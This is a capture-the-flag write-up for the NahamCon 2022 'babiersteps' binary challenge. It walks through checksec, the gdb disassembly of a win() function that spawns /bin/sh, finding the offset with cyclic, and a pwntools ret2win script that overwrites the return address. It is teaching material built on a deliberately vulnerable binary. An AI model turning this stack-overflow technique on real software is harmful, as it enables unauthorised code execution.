# Babiersteps

## Table of Content

<!-- MarkdownTOC -->

- [HowTo](#howto)
	- [Checksec](#checksec)
	- [GDB](#gdb)
	- [Analyze](#analyze)
	- [Script](#script)

<!-- /MarkdownTOC -->

My first steps to solve pwn challs are to check the binary, with `checksec` and functions on gdb when it's possible.

# HowTo

## Checksec

```bash
> checksec babiersteps

[*] '/home/nilgam/pentest/ctfs/nahamcon_2022/binexp/babiersteps/babiersteps'
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## GDB

```gdb
> pwndbg> info func

	All defined functions:

	Non-debugging symbols:
	0x0000000000401000  _init
	0x0000000000401070  puts@plt
	0x0000000000401080  setbuf@plt
	0x0000000000401090  execve@plt
	0x00000000004010a0  __isoc99_scanf@plt
	0x00000000004010b0  _start
	0x00000000004010e0  _dl_relocate_static_pie
	0x00000000004010f0  deregister_tm_clones
	0x0000000000401120  register_tm_clones
	0x0000000000401160  __do_global_dtors_aux
	0x0000000000401190  frame_dummy
	0x0000000000401196  setup
	0x00000000004011c9  win
	0x00000000004011ea  main
	0x0000000000401230  __libc_csu_init
	0x00000000004012a0  __libc_csu_fini
	0x00000000004012a8  _fini
```

```gdb
pwndbg> disass win
Dump of assembler code for function win:
   0x00000000004011c9 <+0>:	endbr64 
   0x00000000004011cd <+4>:	push   rbp
   0x00000000004011ce <+5>:	mov    rbp,rsp
   0x00000000004011d1 <+8>:	mov    edx,0x0
   0x00000000004011d6 <+13>:	mov    esi,0x0
   0x00000000004011db <+18>:	lea    rdi,[rip+0xe26]        # 0x402008
   0x00000000004011e2 <+25>:	call   0x401090 <execve@plt>
   0x00000000004011e7 <+30>:	nop
   0x00000000004011e8 <+31>:	pop    rbp
   0x00000000004011e9 <+32>:	ret    
End of assembler dump.
pwndbg> x/s 0x402008
0x402008:	"/bin/sh"
```

## Analyze

Things to notice :

- No PIE
- win() @ 0x4011c9.
- win() does a execve('/bin/sh')

From that, the solution seems pretty obvious : overwrite the ret addr of main() to go to win().

For that, we need to know the offset to perform this overflow.
In GDB, we run the command `run < <(cyclic 500)`, then we get : 

```
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401220 in main ()
[...]
 ► 0x401220 <main+54>    ret    <0x6261616762616166>
pwndbg> cyclic -o 0x62616166
120
```

## Script

```py
from pwn import *

elf = ELF('./babiersteps')

offset = cyclic_find(0x62616166)

context.binary = elf

payload = offset * b'a'
payload += p64(elf.symbols.win)

# with remote('challenge.nahamcon.com', 31262) as p:
with elf.process() as p:
	p.sendline(payload)
	p.interactive()
```